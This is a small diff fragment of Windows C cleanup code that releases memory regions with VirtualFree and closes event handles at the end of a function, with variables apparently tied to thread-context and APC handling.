     if (contextC) VirtualFree(contextC, 0, MEM_RELEASE);
     if (contextD) VirtualFree(contextD, 0, MEM_RELEASE);
     if (contextE) VirtualFree(contextE, 0, MEM_RELEASE);
+    for (int i = 0; i < 5; i++) {
+        if (callbackArray[i] != NULL) {
+            VirtualFree(callbackArray[i], 0, MEM_RELEASE);
+        }
+    }
     if (callbackArray) VirtualFree(callbackArray, 0, MEM_RELEASE);
     if (ApcThreads) VirtualFree(ApcThreads, 0, MEM_RELEASE);
-	if (Ctx) VirtualFree(Ctx, 0, MEM_RELEASE);
-	if (CtxInit) VirtualFree(CtxInit, 0, MEM_RELEASE);
 	if (CtxFix) VirtualFree(CtxFix, 0, MEM_RELEASE);
-	if (CtxInitFix) VirtualFree(CtxInitFix, 0, MEM_RELEASE);
+	if (CtxHide) VirtualFree(CtxHide, 0, MEM_RELEASE);
+	if (ResumeThreadValue) VirtualFree(ResumeThreadValue, 0, MEM_RELEASE);
+	if (EvntHide) CloseHandle(EvntHide);
+	if (DummyEvent) CloseHandle(DummyEvent);
+
 
     return 0;
 
